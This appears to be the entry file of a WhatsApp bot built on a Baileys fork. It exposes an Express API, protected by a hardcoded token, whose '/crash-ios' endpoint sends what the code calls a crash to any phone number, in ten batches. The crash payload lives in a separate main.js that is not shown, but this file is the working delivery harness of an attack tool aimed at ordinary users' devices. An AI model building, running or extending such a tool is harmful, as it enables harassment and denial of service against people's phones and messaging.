// index.js
const {
  useMultiFileAuthState,
  DisconnectReason,
  makeWASocket,
  generateWAMessageFromContent
} = require("@angstvorfrauen/baileys");
const pino = require("pino");
const fs = require("fs");
const Boom = require("@hapi/boom");
const express = require("express");
const app = express();
app.use(express.json());

// === BAILEYS ===
let sock;
let sessionExists = false;
const main = require("./main.js"); // ← Carrega UMA VEZ

async function connectBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
  sock = makeWASocket({
    printQRInTerminal: false,
    auth: state,
    logger: pino({ level: "silent" })
  });

  // === DEFINE sendjson GLOBAL ===
  sock.sendjson = (jid, content, options = {}) => {
    const msg = generateWAMessageFromContent(jid, content, options);
    return sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
  };

  sessionExists = sock.authState.creds.registered;

  sock.ev.on("messages.upsert", async (chatUpdate) => {
    const m = chatUpdate.messages[0];
    if (!m.message || m.key.remoteJid === "status@broadcast" || m.key.id?.startsWith("BAE5")) return;
    main.handler(sock, m, chatUpdate);
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const reason = Boom.boomify(lastDisconnect?.error)?.output.statusCode;
      sessionExists = false;
      if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) {
        fs.rmSync("./database/Session", { recursive: true, force: true });
      }
      connectBot(); // reconecta
    } else if (connection === "open") {
      sessionExists = true;
      console.log("Bot conectado com sucesso!");
      main.setSocket(sock); // ← Atualiza sock no main.js
    }
  });

  sock.ev.on("creds.update", saveCreds);
}
connectBot();

// === APIs ===
app.get("/", (req, res) => {
  res.json({
    status: "online",
    bot: sessionExists ? "conectado" : "desconectado",
    token: "@xd",
    endpoints: { "/crash-ios?token=@xd&query=NUMERO": "Crash iOS DIRETO" }
  });
});

app.get("/status", (req, res) => res.json({ connected: sessionExists }));

app.get("/connect", async (req, res) => {
  if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
  if (sessionExists) return res.status(400).json({ error: "Sessão já existe" });
  const num = req.query.query?.replace(/[^0-9]/g, "");
  if (!num) return res.status(400).json({ error: "Número inválido" });
  try {
    let code = await sock.requestPairingCode(num);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    res.json({ success: true, code });
  } catch (err) {
    res.status(500).json({ error: "Erro", details: err.message });
  }
});

app.get("/deleteSession", (req, res) => {
  if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
  fs.rmSync("./database/Session", { recursive: true, force: true });
  sessionExists = false;
  connectBot();
  res.json({ success: "Sessão deletada" });
});

// === CRASH iOS DIRETO ===
app.get("/crash-ios", async (req, res) => {
  if (req.query.token !== "@xd") return res.status(401).json({ error: "Token inválido" });
  if (!sessionExists) return res.status(400).json({ error: "Bot não conectado" });

  const num = req.query.query?.replace(/[^0-9]/g, "");
  if (!num) return res.status(400).json({ error: "Número inválido" });

  const targetJid = num + "@s.whatsapp.net";

  try {
    await main.crashIOS(targetJid); // ← SÓ 1 ARGUMENTO
    res.json({ success: true, target: targetJid, message: "Crash enviado (10 lotes)" });
  } catch (err) {
    res.status(500).json({ error: "Falha", details: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`API rodando na porta ${PORT}`);
});
